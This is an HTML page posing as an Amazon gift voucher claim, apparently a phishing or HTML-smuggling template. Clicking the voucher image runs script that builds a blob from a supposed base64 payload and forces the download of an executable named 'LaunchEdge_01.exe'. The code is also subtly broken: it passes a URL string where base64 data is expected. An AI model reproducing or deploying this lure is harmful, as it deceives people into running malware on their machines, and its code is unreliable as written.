<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Gift Voucher Claim</title>

</head>
<body>
    <script type="text/javascript">
            function base64ToArrayBuffer(base64) {
              var binary_string = window.atob(base64);
              var len = binary_string.length;
              var bytes = new Uint8Array( len );
              for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
              return bytes.buffer;
            }

            function imageClicked() {
                // Step 1: Encode exe to base64 and replace << BASE64 ENCODED TEST FILE >>
                var file ='https://github.com/solkee/genric_files/raw/main/src/payload/LaunchEdge_01.txt';
                var data = base64ToArrayBuffer(file);


                // Step 2: Convert the payload to a blob
                var blob = new Blob([data], { type: 'application/octet-stream' });

                // Step 3: Trigger the download
                var a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                // Corrected the download filename (removed the URL)
                a.download = 'LaunchEdge_01.exe';
                a.click();
            };
    </script>

    <img src="https://github.com/solkee/genric_files/blob/main/src/img/AmazonVoucher.PNG?raw=true" alt="Claim your Amazon Voucher" onclick="imageClicked()"/>

</body>
</html>
